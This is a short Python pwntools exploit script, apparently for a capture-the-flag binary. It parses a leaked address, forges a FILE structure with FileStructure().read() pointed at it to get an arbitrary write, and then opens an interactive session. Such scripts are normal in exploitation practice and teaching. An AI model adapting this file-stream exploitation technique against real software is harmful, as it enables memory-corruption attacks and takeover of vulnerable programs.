#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.binary = elf = ELF('./a.out')
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

def slog(n, a): return info(": ".join([n, hex(a)]))

s       = lambda data               :p.send(data)
sa      = lambda delim, data        :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim, data        :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda                    :p.recvline()
ru      = lambda delim, drop=True   :p.recvuntil(delim, drop)
l64     = lambda                    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

p = process()

ru(b':')
win_var = int(rl().strip(), 16)

slog("win_var", win_var)

fp = FileStructure()

pay = fp.read(win_var, 20)

s(pay)

p.interactive()